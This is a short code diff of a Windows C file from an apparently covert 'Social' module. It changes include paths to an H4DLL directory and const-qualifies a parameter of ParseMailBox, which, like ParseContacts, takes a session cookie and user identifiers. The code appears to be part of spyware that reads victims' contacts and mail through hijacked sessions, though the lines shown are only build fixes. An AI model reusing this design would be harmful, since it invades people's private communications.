@@ -1,9 +1,10 @@
+#define _CRT_SECURE_NO_WARNINGS 1
 #include <windows.h>
 #include <stdio.h>
 #include <time.h>
-#include "../common.h"
-#include "../bss.h"
-#include "../LOG.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
@@ -79,7 +80,7 @@ DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
-DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming, BOOL is_draft)
+DWORD ParseMailBox(const char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming, BOOL is_draft)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
